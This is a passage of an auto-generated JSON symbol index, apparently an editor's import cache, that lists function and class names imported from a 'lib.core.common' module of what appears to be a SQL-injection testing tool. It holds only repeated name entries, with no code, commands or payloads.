        "documentation": {}
    },
    {
        "label": "safeFilepathEncode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "saveConfig",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "setColor",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "setOptimize",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "setPaths",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urldecode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "shellExec",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "cleanReplaceUnicode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Format",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "intersect",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizeUnicode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "paramToDict",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "removePostHintPrefix",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "resetCookieJar",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urldecode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "shellExec",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLatestRevision",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pollProcess",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isZipFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseXmlFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "sanitizeStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkOldOptions",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkSystemEncoding",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "expandMnemonics",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "UnicodeRawConfigParser",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "sanitizeStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseXmlFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urldecode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseXmlFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractErrorMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "resetCookieJar",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeLogMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFilteredPageContent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "listToStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "removeDynamicContent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLastRequestHTTPError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDBMSError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseHTTPError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "asciifyUrl",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkSameHost",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "chunkSplitPostData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "escapeJsonValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "evaluateCode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "findMultipartPostBoundary",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getHeader",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getHostHeader",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getRequestHeader",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "logHTTPTraffic",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseJson",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomizeParameterValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "removeReflectiveValues",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeVariableNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeLogMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "stdev",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeVariableNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urldecode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urlencode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDelayed",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractExpectedValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "applyFunctionRecursively",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "cleanQuery",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "expandAsteriskForColumns",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractExpectedValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechniqueData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "initTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseUnionPage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "setTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getHostHeader",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "logHTTPTraffic",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSQLSnippet",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isStackingAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLocalIP",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getRemoteIP",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizePath",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "ntToPosixSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLocalIP",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getRemoteIP",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizePath",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
